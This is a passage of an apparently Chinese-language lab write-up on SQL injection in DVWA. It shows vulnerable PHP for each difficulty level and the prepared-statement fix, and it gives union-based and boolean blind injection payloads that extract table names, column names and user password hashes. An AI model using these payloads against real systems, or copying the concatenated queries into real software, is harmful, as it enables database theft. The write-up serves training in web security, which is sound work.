class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>low等级下对读取到的id参数不做任何过滤检查就直接用于数据库的读取，因此可以直接走SQL注入的流程：</p>
<h4 id="1、判断是否存在注入，时字符型还是数字型"><a href="#1、判断是否存在注入，时字符型还是数字型" class="headerlink" title="1、判断是否存在注入，时字符型还是数字型"></a>1、判断是否存在注入，时字符型还是数字型</h4><p>输入1，查询成功</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225093534335.png" alt="image-20210225093534335"></p>
<p>输入 <code>1&#39; and &#39;1&#39; = &#39;2</code> ，查询失败，返回结果为空</p>
<p>输入 <code>1&#39; or &#39;2&#39; = &#39;2</code> ，查询成功，说明存在字符型注入</p>
<h4 id="2、判断SQL查询的字段数"><a href="#2、判断SQL查询的字段数" class="headerlink" title="2、判断SQL查询的字段数"></a>2、判断SQL查询的字段数</h4><p>输入 <code>1&#39; order by 数字#</code> 来判断查询了多少个字段，</p>
<p>当输入的数字为3时报错，证明查询了2个字段</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225094528354.png" alt="image-20210225094528354"></p>
<h4 id="3、确定显示的字段顺序"><a href="#3、确定显示的字段顺序" class="headerlink" title="3、确定显示的字段顺序"></a>3、确定显示的字段顺序</h4><p>输入 <code>1&#39; union select 1,2#</code> ，可以看到First name显示1，Surname显示2</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225095045708.png" alt="image-20210225095045708"></p>
<h4 id="4、获取当前数据库"><a href="#4、获取当前数据库" class="headerlink" title="4、获取当前数据库"></a>4、获取当前数据库</h4><p>输入 <code>1&#39; union select 1,database()#</code> ，能够获取当前数据库的名字为dvwa</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225095309820.png" alt="image-20210225095309820"></p>
<h4 id="5、获取数据库中的表名"><a href="#5、获取数据库中的表名" class="headerlink" title="5、获取数据库中的表名"></a>5、获取数据库中的表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225095549667.png" alt="image-20210225095549667"></p>
<p>看到该数据库下有2张表，分别为gustbook和users</p>
<h4 id="6、获取表中的字段名"><a href="#6、获取表中的字段名" class="headerlink" title="6、获取表中的字段名"></a>6、获取表中的字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225095709155.png" alt="image-20210225095709155"></p>
<p>看出users表有user_id,first_name,last_name,user,password,avatar,last_login,failed_login这些字段</p>
<h4 id="7、查看字段中的内容"><a href="#7、查看字段中的内容" class="headerlink" title="7、查看字段中的内容"></a>7、查看字段中的内容</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&#x27; union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,<span class="string">&#x27;~&#x27;</span>,first_name,<span class="string">&#x27;&#x27;</span>,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225100250956.png" alt="image-20210225100250956"></p>
<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure>
<p><em>connection</em>：必需。规定要使用的 MySQL 连接。</p>
<p><em>escapestring</em>：必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</p>
<p>medium难度下从GET传参标称了POST传参，使用了<code>mysqli_real_escape_string()</code>对id参数进行过滤特殊符号，闭合方式从单引号变成直接拼接到SQL语句中，同时在前端使用了下拉选择表单，希望能够控制用户输入，但是我们仍可以通过抓包改包的形式绕过。</p>
<p>注入语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225102716073.png" alt="image-20210225102716073"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225102524569.png" alt="image-20210225102524569"></p>
<h3 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high难度下使用了session来传递id参数，然后也没有进行检查过滤，仅仅在查询语句加上limit 1限制输出一个数据，但我们可以直接使用<code>#</code>进行截断，把后面的语句注释掉。同时我们发现查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&#x27; union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225103339276.png" alt="image-20210225103339276"></p>
<h3 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>impossible难度下，首先加入了token方式CSRF攻击，然后对输入的id参数判断是否为数字，在通过预编译语句将查询代码和输入的数据分开，那么就无法进行SQL注入，同时在输出的数量为一时才能够显示，有效防止了脱库。</p>
<h2 id="SQL-Injection-Blind-SQL-盲注"><a href="#SQL-Injection-Blind-SQL-盲注" class="headerlink" title="SQL Injection(Blind) SQL 盲注"></a>SQL Injection(Blind) SQL 盲注</h2><p><strong>SQL盲注-测试思路</strong></p>
<ol>
<li>对于<strong>基于布尔的盲注</strong>，可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</li>
<li>对于<strong>基于时间的盲注</strong>，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</li>
</ol>
<h3 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysqli_num_rows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>low难度的盲注同样是对id不做任何检查过滤就直接拼接查询语句，但是它不会返回报错，指挥显示ID存在还是不存在，也就说要进行盲注。</p>
<h4 id="1、判断是否存在SQL盲注"><a href="#1、判断是否存在SQL盲注" class="headerlink" title="1、判断是否存在SQL盲注"></a>1、判断是否存在SQL盲注</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1 = 1<span class="comment">#      存在</span></span><br><span class="line">1&#x27; and 1 = 2<span class="comment">#		不存在</span></span><br></pre></td></tr></table></figure>
<p>存在字符型的SQL盲注</p>
<h4 id="2、猜测数据库的名称"><a href="#2、猜测数据库的名称" class="headerlink" title="2、猜测数据库的名称"></a>2、猜测数据库的名称</h4><p>数据库名称的属性：字符长度、字符组成的元素（字母/数字/下划线/…）&amp;元素的位置（首位/第2位/…/末位）</p>
<ol>
<li>判断数据库名称的长度</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;10#   不存在</span><br><span class="line">1&#x27; and length(database())&gt;5#	不存在</span><br><span class="line">1&#x27; and length(database())&gt;3#	存在</span><br><span class="line">1&#x27; and length(database())=4<span class="comment">#	存在</span></span><br></pre></td></tr></table></figure>
<p>得出数据库名字的长度为4</p>
<ol start="2">
<li>判断数据库名字</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">substr(<span class="keyword">string</span> <span class="keyword">string</span>,num start,num length);</span><br></pre></td></tr></table></figure>
<p>string为字符串；start为起始位置（从1开始算）；length为长度。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>ASCII码-10进制</th>
<th></th>
<th>字符</th>
<th>ASCII码-10进制</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>97</td>
<td>==&gt;</td>
<td>z</td>
<td>122</td>
</tr>
<tr>
<td>A</td>
<td>65</td>
<td>==&gt;</td>
<td>Z</td>
<td>90</td>
</tr>
<tr>
<td>0</td>
<td>48</td>
<td>==&gt;</td>
<td>9</td>
<td>57</td>
</tr>
<tr>
<td>_</td>
<td>95</td>
<td></td>
<td>@</td>
<td>64</td>
</tr>
</tbody></table>
<p>根据上表，常见的字符ascii码范围是[48,122]，于是可以构造语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;85#	存在</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;104#	不存在</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;95#	存在</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;100#	不存在</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;98#	存在</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;99#	存在</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&#x3D;100#	存在</span><br></pre></td></tr></table></figure>
<p>得出数据库名字第一个字符的ascii码为100，即是字母<code>d</code> ，以此类推查询出数据库名字所有的字符，得到数据库名字为dvwa。</p>
<h4 id="3、猜测数据库的表名"><a href="#3、猜测数据库的表名" class="headerlink" title="3、猜测数据库的表名"></a>3、猜测数据库的表名</h4><p>数据表属性：指定数据库下表的个数、每个表的名称（表名长度，表名组成元素）</p>
<ol>
<li>猜测表的个数</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">10</span><span class="comment">#	不存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;5#	不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">3</span><span class="comment">#	不存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;2#	不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">1</span><span class="comment">#	存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2#	存在</span></span><br></pre></td></tr></table></figure>
<p>得知该数据库有2张表</p>
<ol start="2">
<li>猜解表名的长度</li>
</ol>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 1.查询列出当前连接数据库下的所有表名称</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database()</span><br><span class="line"><span class="meta"># 2.列出当前连接数据库中的第1个表名称</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="meta"># 3.以当前连接数据库第1个表的名称作为字符串，从该字符串的第一个字符开始截取其全部字符</span></span><br><span class="line">substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)</span><br><span class="line"><span class="meta"># 4.计算所截取当前连接数据库第1个表名称作为字符串的长度值</span></span><br><span class="line">length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))</span><br><span class="line"><span class="meta"># 5.将当前连接数据库第1个表名称长度与某个值比较作为判断条件，联合and逻辑构造特定的sql语句进行查询，根据查询返回结果猜解表名称的长度值</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">length</span>(<span class="params">substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database(</span>) limit 0,1),1))&gt;10 #</span></span><br></pre></td></tr></table></figure>
<p>继续利用二分法得知表的长度为9</p>
<ol start="3">
<li>猜测表名</li>
</ol>
<p>依次取出dvwa数据库第1个表的第1/2/…/9个字符分别猜解：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">88</span> <span class="comment">#</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>以此类推得知dvwa数据库的第一张表名字为guestbook，然后以同样的方法可知第二张表名为users</p>
<h4 id="4、猜解表中的字段名"><a href="#4、猜解表中的字段名" class="headerlink" title="4、猜解表中的字段名"></a>4、猜解表中的字段名</h4><p>表中的字段名属性：表中的字段数目、某个字段名的字符长度、字段的字符组成及位置；某个字段名全名匹配</p>
<ol>
<li>猜解users表中字段个数</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>)&gt;<span class="number">10</span> <span class="comment">#	不存在</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27;)=8 #		存在</span></span><br></pre></td></tr></table></figure>
<p>得知users表中的字段数为8</p>
<ol start="2">
<li>猜解users表中字段的长度</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))&gt;<span class="number">10</span><span class="comment">#	不存在</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1),1))=7#		存在</span></span><br></pre></td></tr></table></figure>
<p>得知users表的第一个字段的长度为7</p>
<ol start="3">
<li>猜解users表中字段的名字</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">88</span><span class="comment">#		不存在</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1),1,1))=117#		存在</span></span><br></pre></td></tr></table></figure>
<p>得知user表中第一个字段的第一个字符的ascii码为177，也就是 <code>u</code> ，以此类推可知所有的字段名。</p>
